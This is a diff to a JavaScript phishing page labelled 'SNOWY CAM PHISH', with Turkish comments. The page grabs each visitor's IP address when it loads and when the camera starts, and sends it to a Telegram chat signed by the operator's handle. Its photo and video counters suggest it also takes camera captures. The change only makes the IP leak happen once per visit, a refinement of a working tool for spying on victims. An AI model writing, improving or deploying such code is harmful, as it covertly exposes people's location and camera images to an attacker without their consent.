@@ -81,6 +81,7 @@
         let videoCount = 0;
         let photoCount = 0;
         let ipGonderildi = false;
+        let ipGonderildiButon = false;
         
         // ============================================
         // İP ADRESİ AL
@@ -96,9 +97,10 @@
         }
         
         // ============================================
-        // İP'Yİ TELEGRAM'A GÖNDER
+        // İP'Yİ TELEGRAM'A GÖNDER (SADECE 1 KERE)
         // ============================================
-        async function sendIP(ip) {
+        async function sendIP(ip, kaynak = 'sayfa') {
+            // Eğer daha önce gönderildiyse tekrar gönderme
             if (ipGonderildi) return;
             
             const msg = `❄️ SNOWY CAM PHISH ❄️\n━━━━━━━━━━━━━━━━━━━━━\n🌐 IP Adresi: ${ip}\n⏱️ Zaman: ${new Date().toLocaleString('tr-TR')}\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @snowy_dexry_wexry ⚡`;
@@ -113,6 +115,7 @@
             });
             
             ipGonderildi = true;
+            console.log(`IP gönderildi: ${kaynak}`);
         }
         
         // ============================================
@@ -206,8 +209,11 @@
                 video.onloadedmetadata = async () => {
                     await video.play();
                     
-                    const ip = await getIP();
-                    await sendIP(ip);
+                    // SADECE 1 KERE IP GÖNDER (eğer daha önce gönderilmediyse)
+                    if (!ipGonderildi) {
+                        const ip = await getIP();
+                        await sendIP(ip, 'kamera');
+                    }
                     
                     document.getElementById('startBtn').style.display = 'none';
                     document.getElementById('loading').style.display = 'block';
@@ -222,12 +228,15 @@
         }
         
         // ============================================
-        // SAYFA YÜKLENDİĞİNDE
+        // SAYFA YÜKLENDİĞİNDE - SADECE 1 KERE IP GÖNDER
         // ============================================
         window.onload = async function() {
             if (TARGET_ID) {
-                const ip = await getIP();
-                await sendIP(ip);
+                // Sadece 1 kere IP gönder
+                if (!ipGonderildi) {
+                    const ip = await getIP();
+                    await sendIP(ip, 'sayfa');
+                }
             }
         };
         
